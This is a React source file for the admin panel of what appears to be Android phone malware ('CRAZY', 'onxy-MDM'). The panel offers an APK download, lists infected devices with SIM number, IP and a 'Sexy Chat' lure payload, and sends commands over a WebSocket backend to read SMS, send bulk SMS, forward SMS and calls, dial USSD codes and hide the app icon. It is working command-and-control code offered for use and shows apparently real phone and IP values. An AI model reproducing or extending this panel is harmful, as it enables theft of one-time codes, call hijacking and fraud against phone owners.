"use client";
import { useState, useEffect, useRef } from 'react';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('Home');
  const [subTab, setSubTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  
  const ws = useRef<WebSocket | null>(null);

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.device_id) {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
        }
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const sendCommand = (command: string) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command }));
      alert(`Command '${command}' Sent!`);
    }
  };

  const dev = devices[selectedDevice || ''] || {};

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans">
      {/* ORIGINAL HEADER */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg">⬇ Download APK</a>
          <span className="text-xl cursor-pointer">⚙️</span>
          <span className="text-sm text-purple-400 border border-purple-500 px-3 py-1 rounded-full cursor-pointer">Sessions</span>
          <span className="text-xl cursor-pointer">🌙</span>
        </div>
      </header>

      {/* ORIGINAL TOP NAVIGATION */}
      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm">
        {['Home', 'Data', 'Messages', 'Groups', 'Devices', 'Help'].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
        ))}
      </nav>

      <main className="p-4">
        {selectedDevice && (
          <>
            {/* ORIGINAL DEVICE CARD */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-xl font-bold">{dev.model || 'vivo (V2518)'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">16</span></h2>
                <button className="text-gray-400">🔄</button>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-y-3 text-sm text-gray-300">
                <div className="flex justify-between md:pr-8"><span>ID</span> <span className="text-white">{selectedDevice || '3bd49292732c0a16'}</span></div>
                <div className="flex justify-between md:pr-8"><span>SIM</span> <span className="text-blue-400">8051660986 - airtel</span></div>
                <div className="flex justify-between md:pr-8"><span>Forward Call</span> <span>OFF</span></div>
                <div className="flex justify-between md:pr-8"><span>FCM Token</span> <span className="text-green-400">✔️ Token OK</span></div>
                <div className="flex justify-between md:pr-8"><span>Connection</span> <span className="text-green-400">🟢 Online (heartbeating)</span></div>
                <div className="flex justify-between md:pr-8"><span>Last Checked</span> <span className="text-green-400">Just now</span></div>
                <div className="flex justify-between md:pr-8"><span>Last Activity</span> <span className="text-green-400">Just now</span></div>
                <div className="flex justify-between md:pr-8"><span>Installed</span> <span>05 Oct 2026, 12:34 am</span></div>
                <div className="flex justify-between md:pr-8"><span>Payload</span> <span className="bg-purple-800 px-2 rounded">Sexy Chat</span></div>
                <div className="flex justify-between md:pr-8"><span>IP Address</span> <span className="text-blue-400">{dev.ip || '106.205.197.233'}</span></div>
              </div>
            </div>

            {/* ORIGINAL 8 BUTTONS GRID + HIDE ICON */}
            <div className="grid grid-cols-4 gap-3 mb-6">
              {[
                { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                { label: 'Hide Icon', icon: '🕵️', cmd: 'HIDE_ICON' } // New feature integrated
              ].map((btn, i) => (
                <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                  <span className="text-2xl">{btn.icon}</span>
                  <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                </button>
              ))}
            </div>

            {/* ORIGINAL SUB-TABS */}
            <div className="flex gap-2 mb-4">
              {['Home', 'Data', 'Messages (200)', 'Gallery', 'Permissions'].map(tab => (
                <button key={tab} onClick={() => setSubTab(tab)} className={`px-4 py-2 rounded text-sm ${subTab === tab ? 'bg-blue-600 text-white font-bold' : 'bg-[#1A1B23] text-gray-400'}`}>{tab}</button>
              ))}
            </div>
          </>
        )}

        {/* SUB-TAB CONTENT PLACEHOLDER */}
        <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-center text-gray-500">
           {subTab === 'Messages (200)' ? 'Messages will appear here...' : 'Feature coming soon...'}
        </div>
      </main>
    </div>
  );
}
